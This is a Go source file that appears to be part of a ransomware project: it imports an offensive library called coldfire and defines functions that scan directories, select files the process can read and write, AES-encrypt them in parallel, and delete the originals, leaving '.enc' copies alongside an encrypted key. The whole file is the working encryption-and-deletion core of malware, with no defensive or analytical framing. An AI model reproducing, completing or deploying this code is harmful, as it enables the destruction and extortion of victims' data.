package file

import (
	"fmt"
	"os"
	"runtime"
	"sync"

	cf "frostbite.com/coldfire"
	enc "frostbite.com/encryption"
	scan "frostbite.com/tools/scan"
)

var pl = fmt.Println

func LockFilesInDir(startDirPath string, skipHiddenDirs bool, encryptedAESKey []byte, AESKey []byte) error {
	// scan only non hidden directories
	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
	// filesToEncrypt := ScanFilesInDirWithLockAdd(startDirPath, skipHiddenDirs, encryptedAESKey)
	filesToEncrypt, err := scan.ScanFilesInDirWithLockAdd(startDirPath, skipHiddenDirs, encryptedAESKey)
	if err != nil {
		return err
	}

	wg := sync.WaitGroup{}
	wg.Add(len(filesToEncrypt))

	for _, filePath := range filesToEncrypt {
		go func(filePath string) error {
			encryptedFileData, err := enc.EncryptFileAES(AESKey, filePath)
			if err != nil {
				return err
			}
			os.WriteFile(filePath+".enc", encryptedFileData, 0644)
			os.Remove(filePath)
			wg.Done()
			return nil
		}(filePath)
	}
	wg.Wait()
	return nil
}

func RunEncryptForCurrentDir(encryptedAESKey []byte, AESKey []byte) (fileList []string, err error) {

	// get pwd
	currentDir, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	LockFilesInDir(currentDir, true, encryptedAESKey, AESKey)
	pl("current dir: ", currentDir)
	return fileList, nil
}

func GetListOfAccessibleFiles(fileList []string) []string {
	ch := make(chan string)
	wg := sync.WaitGroup{}
	wg.Add(len(fileList))

	fileListWithAccess := make([]string, 0)
	for _, file := range fileList {
		go func(file string, ch chan string) {
			read, write := cf.FilePermissions(file)
			if read && write {
				ch <- file
			}
			wg.Done()
		}(file, ch)
	}

	go func() {
		wg.Wait()
		close(ch)
	}()

	for file := range ch {
		fileListWithAccess = append(fileListWithAccess, file)
	}
	return fileListWithAccess
}

func LockFilesArray(filesToEncrypt []string, AESKey []byte) {
	// scan only non hidden directories

	// runtime.GOMAXPROCS(16)
	numCPU := runtime.NumCPU()
	if numCPU >= 4 {
		runtime.GOMAXPROCS(numCPU - 2)
	} else {
		runtime.GOMAXPROCS(1)
	}

	wg := sync.WaitGroup{}

	// limit the number of goroutines
	filesProcessed := 0
	for i := 0; i < len(filesToEncrypt); i += numCPU {
		// wait until there's room for another goroutine to start
		for j := 0; j < numCPU && i+j < len(filesToEncrypt); j++ {
			wg.Add(1)
			// TODO: Make an error chanel and listen to it
			go func(index int) error {
				defer wg.Done()
				_, err := enc.EncryptFileAES(AESKey, filesToEncrypt[index])
				if err != nil {
					return err
				}
				os.Remove(filesToEncrypt[index])
				filesProcessed++
				return nil
			}(i + j)

		}

		// log the progress in percent
		percent := (float64(i) / float64(len(filesToEncrypt))) * 100
		// print progress in percent, limit to 2 decimal places
		fmt.Printf("Progress: %.2f%%\r", percent)
		wg.Wait()
	}
	pl("Files processed: ", filesProcessed)
}
